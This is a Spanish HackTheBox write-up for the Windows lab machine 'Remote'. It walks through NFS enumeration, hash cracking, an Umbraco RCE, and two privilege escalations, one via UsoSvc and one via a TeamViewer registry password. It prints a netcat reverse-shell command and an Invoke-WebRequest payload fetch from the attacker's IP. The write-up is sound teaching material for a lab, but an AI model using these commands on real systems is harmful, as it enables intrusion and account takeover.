@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Remote</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Remote | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Remote" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer." />
+<meta property="og:description" content="Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer." />
+<link rel="canonical" href="http://localhost:4000/htb/remote" />
+<meta property="og:url" content="http://localhost:4000/htb/remote" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-09-05T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png" />
+<meta property="twitter:title" content="HackTheBox - Remote" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-09-05T00:00:00-07:00","datePublished":"2020-09-05T00:00:00-07:00","description":"Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer.","headline":"HackTheBox - Remote","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/remote"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/remote"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Remote</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-09-05">05 Sep 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png" alt="HackTheBox - Remote">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/remoteHTB.png" alt="remoteHTB" /></p>
+
+<h3 id="tlrd-spanish-writeup">TL;RD (Spanish writeup)</h3>
+
+<blockquote>
+  <p>Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo, además muestro errores que cometi o me extiendo por que si :P por si vez mucho texto ya sabes la razón</p>
+</blockquote>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<p>Como es habitual, reviso que servicios está corriendo la maquina, en este caso el escaneo va lento, así que le agrego algunos para acelerar el proceso.</p>
+
+<pre><code class="language-bash">$ nmap -p- --open -v -n --min-rate=5000 10.10.10.180 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los puertos</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-n</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como resolución DNS</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable, ya veremos para qué</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/initScan.png" alt="nmapInitScan" /></p>
+
+<p>Con la función que maneja <a href="https://s4vitar.github.io/">s4vitar</a> puedo extraer los puertos del archivo <strong>initScan</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/extractPorts.png" alt="extractPorts" /></p>
+
+<p>La ejecución es sencilla, solo se debe agregar la función al <code>$ ~/.bashrc</code> y correr el comando:</p>
+
+<pre><code class="language-bash">$ extractPorts initScan
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/extractPortsRun.png" alt="extractPortsRun" /></p>
+
+<p>Bien, ahora solo queda pegar lo que tenemos en la clipboard y usarlo en el escaneo que haré.</p>
+
+<pre><code class="language-bash">$ nmap -p21,80,111,135,139,445,49665 -sC -sV 10.10.10.180 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/portScan1.png" alt="portScan1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/portScan2.png" alt="portScan2" /></p>
+
+<p>Algunos puertos interesantes eh, FTP, HTTP, RPC (Remote Procedure Call), NetBIOS, Samba y un puerto alto que ni idea…</p>
+
+<h3 id="empecemos-con-el-puerto-21-ftp">Empecemos con el puerto 21 FTP.</h3>
+
+<p>Al ingresar solo muestra esto. Puedo suponer que hay algún servicio conectado al puerto FTP, pero que ahora no vemos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/ftpinit.png" alt="ftpinit" /></p>
+
+<h3 id="sigamos-con-el-servidor-web-del-puerto-80">Sigamos con el servidor web del puerto 80.</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pagehome.png" alt="pagehome" /></p>
+
+<p>Revisando la página web solo encontramos una redirección en <code>http://10.10.10.180/contact/</code> que lleva a un login.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pageumbracologin.png" alt="pageumbracologin" /></p>
+
+<p>Nada más, no hay credenciales por defecto, no hay injeccion SQL o XSS. Sigamos</p>
+
+<h3 id="busquemos-con-el-puerto-111-rpc">Busquemos con el puerto 111 RPC.</h3>
+
+<p>Internet tiene un montón de info sobre como explotar el servicio que corre en el puerto 111, entre ellos encontré un post donde explican que si en nuestro escaneo vemos <strong>nfs</strong> (Network File System), significa que tenemos la posibilidad de hacer una montura con la información que se está compartiendo, básicamente:</p>
+
+<ul>
+  <li><a href="https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc">Info sobre <strong>showmount</strong> y <strong>mount</strong></a>.</li>
+</ul>
+
+<blockquote>
+  <p><strong>NFS</strong>: Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.</p>
+</blockquote>
+
+<p>Para verificar que información o archivos están disponibles para ver.</p>
+
+<pre><code class="language-bash">$ showmount -e 10.10.10.180
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/mountnfs.png" alt="mountnfs" /></p>
+
+<p>Para hacer la montura en nuestro sistema.</p>
+
+<pre><code class="language-bash">$ mount -t nfs 10.10.10.180:/site_backups ~/remote/content/rpc_info_nfs -o nolock
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/mountnfsdone.png" alt="mountnfsdone" /></p>
+
+<p>Enumerando no encontré nada, no supe buscar, así que me fui para la web, si buscamos si existe algún archivo que guarde credenciales en el CMS umbraco encontramos que si, <strong>Umbraco.sdf</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/umbracosdfcreds.png" alt="Umbracosdfcreds" /></p>
+
+<p>Encontramos hashes y dos posibles usuarios, vamos a <strong>crackstation</strong>, john, hashcat, etc… A ver si las herramientas nos pueden crackear algo.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/johncrackumbraco.png" alt="johncrackumbraco" /></p>
+
+<p>Listo, me fui para el <strong>login</strong>, intente hasta el desespero jajaj, pero no me servía, no entendía por qué. Simplemente no estaba tomando todo el dominio del usuario <code>admin</code>, es la primera vez que me encuentro con estos problemas y me gusta encontrarlo. Algunos proveedores o CMS usan el dominio junto al usuario como método para registro, por lo tanto al intentar ingresar con el usuario <code>admin</code> y la password no funciona. Como se ve en la imagen donde están los hash, el usuario está junto a un dominio.</p>
+
+<blockquote>
+  <p><code>admin@htb.local</code></p>
+</blockquote>
+
+<p>Y al intentar con este usuario si me permitió ingresar al dashboard (:)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pageumbracodash.png" alt="pageumbracodash" /></p>
+
+<p>Encontramos otro usuario (confirmamos el nickname <strong>ssmith</strong> en la imagen de los hash).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pageumbracousers.png" alt="pageumbracousers" /></p>
+
+<p>Listos, en este punto sabemos que estamos dentro de un CMS llamado Umbraco, lo siguiente seria buscar la versión y exploits con <strong>searchsploit</strong> o la web.</p>
+
+<ul>
+  <li>Este es el exploit: <a href="https://www.exploit-db.com/exploits/46153">https://www.exploit-db.com/exploits/46153</a></li>
+</ul>
+
+<p>El exploit encontrado «explota» dentro de la plataforma un archivo llamado <code>/umbraco/developer/Xslt/xsltVisualize.aspx</code> que tiene la posibilidad de darnos un RCE con el parámetro <strong>ctl00$body$xsltSelection</strong>. Como POC el exploit ejecuta una calculadora, pero pa que queremos una calculadora jajaj, vamos a por una reverse Shell.</p>
+
+<p>Revisando el código y algunas referencias en internet, lo que le indica el programa que se va a ejecutar en la cmd (claramente) es <code>proc.StartInfo.FileName = "calc.exe"</code>, pero esta función necesita (si queremos ejecutar otra herramienta diferente a la calculadora :P) llevar algo en <code>proc.StartInfo.Arguments = "whatever"</code>.</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs">Explica como trabajan <strong>StartInfo.Arguments</strong> y <strong>StartInfo.FileName</strong></a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/beautycsharp.png" alt="beautycsharp" /></p>
+
+<p>Como ejemplo realice un <code>ping</code> hacia la misma máquina a ver si me respondía.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/exploitumbroping.png" alt="exploitumbroping" /></p>
+
+<p>Pero intentando <strong>cmd.exe</strong> y algunas variantes para probar <code>whoami</code> no podia tener output. Leyendo en internet las propiedades de <code>StartInfo</code> y algunos errores de stackoverflow encontré un error en el que me daba una pista clave :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/stackoverflow.png" alt="stackoverflow" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/exploitdir.png" alt="exploitdir" /></p>
+
+<p>Algunas referencias</p>
+
+<ul>
+  <li><a href="https://www.dotnetperls.com/process">process-examples</a>.</li>
+  <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments?view=netcore-3.1">system.diagnostics.processstartinfo.argument</a>.</li>
+  <li><a href="https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027">how-to-pass-multiple-arguments-in-processstartinfo</a>.</li>
+</ul>
+
+<p>Perfecto puedo ejecutar comandos dentro de la maquina, lo siguiente seria lograr una reverseshell o alguna herramienta/archivo que se vea interesante. Desde el exploit puedo ver la flag del <code>user.txt</code>, peeero la papita esta en conseguir una reverse shell.</p>
+
+<p>Despues de algunos intentos con <code>certutil.exe</code> no logre ejecutarlo correctamente, buscando recorde que invocando una petición con <strong>PowerShell</strong> era posible descargar algun archivo de un servidor que previamente se tenga arriba.</p>
+
+<p>Por lo tanto la idea es mover el binario <strong>nc.exe</strong> a una ruta de trabajo, en esa misma ruta montar un servidor web con python: <code>python -m SimpleHTTPServer</code> y lo siguiente seria dentro del payload indicarle esto para que descargue a Windows el archivo.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/exuploadnc.png" alt="exuploadnc" /></p>
+
+<p>Y ya tendria en el sistema el binario netcat.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/exdirnc.png" alt="exdirnc" /></p>
+
+<p>Ahora queda ejecutar una peticion con <strong>nc.exe</strong> hacia mi maquina pidiendole que llame una consola al generar la conexion :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/exncdone.png" alt="exncdone" /></p>
+
+<p>Listos, adeeeeentro. A por la escalacion de privilegios.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Revisando permisos con <code>&gt; whoami /priv</code> me muestra esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/isswhoamipriv.png" alt="iiswhoamipriv" /></p>
+
+<p>Revisando por internet al tener el privilegio <code>SeImpersonatePrivilege - Impersonate a client after authentication</code> habilitado existe un programa (<strong>JuicyPotato.exe</strong>) que se apoya en el privilegio que tenemos para ejecutar la tarea especificada como Administrador. Estuve un tiempo intentando pero no logre que funcionara, en internet hacian referencia (y en un video de <a href="https://www.youtube.com/watch?v=1ae64CdwLHE&amp;t=2320">ippsec</a> que si el sistema operativo tenia que ver con Server 2019 no iba a funcionar. Asi que entendí el por que de que no me sirviera) ): (o quizas fue error mio).</p>
+
+<p>Info del sistema:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/isssysteminfo.png" alt="iissysteminfo" /></p>
+
+<p>Enumerando y revisando, encontramos con el comando <code>&gt; netstat -a</code> las conexiones de red actuales.</p>
+
+<ul>
+  <li><a href="https://geekflare.com/netstat-command-usage-on-windows/">Info netstat: netstat-command-usage-on-windows</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/issnetstata.png" alt="iisnetstata" /></p>
+
+<p>Acá quede desconcertado, ya que el escaneo inicial no nos habia mostrado tantos puertos abiertos. Procedi a validar y en efecto, no se si el parametro <code>--min-rate</code> hizo que no se alcanzaran a ver esos puertos pero bueno el nuevo escaneo mostro esto.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/initscanv2.png" alt="initscanv2" /></p>
+
+<p>Acá ya veo algo interesante, dos puertos con posibilidad de acceso remoto mediante la herramienta <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> explotando el servicio WinRM para obtener una shell. Por un lado el <strong>puerto 47001</strong> con WinRM (Windows Remote Management) y el <strong>puerto 5985</strong> con WsMan (WS-Management).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/portscanv21.png" alt="portscanv21" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/portscanv22.png" alt="portscanv22" /></p>
+
+<p>Siguiendo con la escalación de privilegios… Estuve mis buenas horas buscando y enumerando, la enumeración en Windows me cuesta un poco más, lo raro que encontre fue que <strong>TeamViewer</strong> en su <strong>version 7</strong> esta instalado, lo cual en ninguna maquina viene por defecto y ya es algo para fijarse (además que la maquina se llama REMOTE y… <strong>que hace TeamViewer?¿?¿</strong>), de resto nada, buscando exploits en internet, archivos donde se guarden credenciales; parecé que no supe buscar por que no encontre nada</p>
+
+<p>Revisé el foro oficial en HTB de la maquina a ver si podria enfocar lo que tenia o lo que me faltaba.</p>
+
+<p>Pues leyendo vi que hay dos maneras para explotar, una que relacionaban con TV (perfecto para no spoilear, ademas ya sabemos que significa) y otra (que llamaban U….c) que entendi solo cuando a alguien se le solto y no lo marcaron como spoiler. <strong>Vamos a resolverla por los dos metodos :)</strong></p>
+
+<p>…</p>
+
+<h3 id="método-usosvc">Método UsoSvc</h3>
+
+<p>Pues si, buscando informacion me encontre con que <strong>UsoSvc</strong> basicamente funciona como administrador de actualizaciones en windows</p>
+
+<blockquote>
+  <p>Este servicio es responsable de descargar, instalar y buscar actualizaciones en su computadora. <a href="http://windowsbulletin.com/es/what-is-update-orchestrator-service/">Acá la referencia</a></p>
+</blockquote>
+
+<p>¿Pero de que me sirve saber esto? Bueno, hay un conjunto de herramientas (Github <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>), entre ellas una que podemos usar para validar que rutas de <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">escalar privilegios</a> tenemos (una ruta seria UsoSvc). Se me habia olvidado usarla antes, es <strong>PowerUp.ps1</strong>, usaremos una funcion que trae llamada <strong>Invoke-AllChecks</strong>.</p>
+
+<blockquote>
+  <p>Info del mismo archivo sobre AllChecks: Runs all functions that check for various Windows privilege escalation opportunities.</p>
+</blockquote>
+
+<p>Guiandome con un video de <a href="https://www.youtube.com/watch?v=qEhXMZ1GYpE&amp;t=3057">s4vitar</a> en el que explota en una maquina el mismo servicio <strong>UsoSvc</strong> realizaremos esto:</p>
+
+<h5 id="1-pues-descargarnos-powerupps1-p">1. Pues descargarnos PowerUp.ps1 :P</h5>
+<h5 id="2-pasarlo-a-windows">2. Pasarlo a windows</h5>
+
+<p>~ Linux:</p>
+
+<p>Levantamos un servidor web donde tengamos el archivo.</p>
+
+<pre><code class="language-bash">$ python -m SimpleHTTPServer
+</code></pre>
+
+<p>~ Windows:</p>
+
+<p>Podriamos correr el exploit para pasarnos el <strong>PowerUp.ps1</strong> pero viendo el video aprendi que no era necesario, podemos hacerlo desde cmd simplemente moviendonos a la carpeta donde queremos el archivo y abriendo una sesión powershell.</p>
+
+<pre><code class="language-powershell">&gt; powershell
+PS &gt; Invoke-WebRequest http://10.10.15.69:&lt;puerto_que_levanta_python&gt;/PowerUp.ps1 -o PowerUp.ps1 # -o de output, le ponemos el nombre de como queremos que quede el archivo
+PS &gt; Invoke-Module ./PowerUp.ps1
+PS &gt; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt # Guardamos la ejecución del modulo en un archivo llamado checks.txt
+</code></pre>
+
+<p>Listo, validando el contenido de <code>checks.txt</code> tenemos:</p>
+
+<p>Nuestro servicio <strong>UsoSvc</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pscheckstxt1.png" alt="pscheckstxt1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pscheckstxt2.png" alt="pscheckstxt2" /></p>
+
+<p>Revisando este archivo no hay algo que resalte.</p>
+
+<p>Pues ya solo nos queda ejecutar la instrucción que el propio <strong>checks</strong> nos brinda: <code>Invoke-ServiceAbuse -ServiceName 'UsoSvc'</code> pasándole el comando que queremos ejecutar.</p>
+
+<pre><code class="language-powershell">PS &gt; Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "c:\Windows\TEMP\\nc.exe 10.10.15.69 443 -e cmd.exe"
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/psusosvcexp.png" alt="psusosvcexp" /></p>
+
+<p>Perfecto, tenemos una reverse Shell como usuario administrador</p>
+
+<p>Las flags serían estas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/psechoflags.png" alt="psechoflags" /></p>
+
+<p>Lo que vi con este método es que la conexión se pierde a los pocos segundos (ya te imaginas como conseguí las flags :s) Ni siquiera sabría como buscar en internet si es un problema, un comando que necesito de más o incluso que la propia maquina es la que pueda estar terminando la petición.</p>
+
+<p>…</p>
+
+<h3 id="método-tv-teamviewer">Método TV (TeamViewer)</h3>
+
+<p>Bueno como comente arriba, en la enumeración se ve el directorio y sus componentes dentro de <code>Program Files (x86)</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/enumtv.png" alt="enumtv" /></p>
+
+<p>…</p>
+
+<p>Pero no veo nada en ninguno de ellos, en internet se habla que <strong>TeamViewer</strong> guarda en memoria y en un <strong>registro</strong> fragmentos de un ID y contraseña de un usuario, pero no encuentro en que registro.</p>
+
+<p>Peeero, me di en la tarea de volver a realizar la búsqueda en internet, pero en este caso leyendo bien y prestando atención, tanta atención que en el primer link encontré mi salvación :) En un hilo de la misma comunidad de TeamViewer encontré esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pagepathtohkeytv.png" alt="pagepathtohkeytv" /></p>
+
+<p>Opa, veamos en Windows que nos encuentra.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/regqueryhkeytv.png" alt="regqueryhkeytv" /></p>
+
+<p>Bien, hay un registro de TeamViewer Versión 7, haciendo la misma instrucción pero con <code>Version7</code></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/regqueryhkeytv7.png" alt="regqueryhkeytv7" /></p>
+
+<p>Vemos el ID del que se habla, un usuario <strong>admin</strong> y una contraseña en cifrado AES (de la cual también se habla por internet).</p>
+
+<p>Pues hay un blog que explica como se ejecuta la vulnerabilidad y además nos brinda un <strong>exploit</strong> en el que solo debemos modificar la cadena AES. Pero hablando muy sencillo, es que TeamViewer usa por defecto una <strong>key</strong> y un <strong>iv</strong>, por lo tanto si esos dos parámetros son reusables podemos, primero, desencriptar la cadena que contiene la pw y después escalar privilegios.</p>
+
+<ul>
+  <li><a href="https://whynotsecurity.com/blog/teamviewer/">Acá la gran explicación y el exploit</a>.</li>
+</ul>
+
+<p>Modificando la cadena y ejecutando el exploit quedaría así:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/pytvAES.png" alt="pytvAES" /></p>
+
+<p>Perfecto, tenemos la password, que entiendo sea del usuario <strong>admin</strong>, solo nos quedaría conectarnos a la máquina con esas credenciales</p>
+
+<p>Ejecutando TeamViewer nos va a pedir un ID de usuario, lo que nos permitiría conectarnos al pc remoto, pero enumerando no encontré nada. Recordemos que antes en nuestro escaneo habíamos visto dos posibles entradas abusando del servicio <em>WinRM</em>, bueno vamos a probar. En este caso el usuario <strong>admin</strong> del registro encontrado debe ser de TV, pero como sabemos, en Windows el usuario administrador se llama <strong>Administrator</strong>.</p>
+
+<p>Pues si hacemos uso de la herramienta con las credenciales que tenemos logramos obtener la Shell.</p>
+
+<p>El puerto con conexión remota es el <strong>5985</strong> y eso sería todo, acá vemos los directorios de las flags, que de igual forma habíamos encontrado con la explotación de <strong>UsoSvc</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/wraccess.png" alt="wraccess" /></p>
+
+<p>…</p>
+
+<p>Qué bonita maquina, disfrute mucho la explotación para llegar al user, casi lloro con encontrar el register key, pero me encanto. No había explotado el servicio <strong>UsoSvc</strong> antes, pero esa explotación fue sencilla, me sirvió para acordarme de <strong>PowerUp.ps1</strong> y todas sus funcionalidades. De resto muchas gracias por leer este chorrazo de texto. Pero pues me gusta mostrar los fails y los success :) A romper todo &lt;3</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Remote&url=http://localhost:4000/htb/remote" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CMS">CMS</a>               
+                    
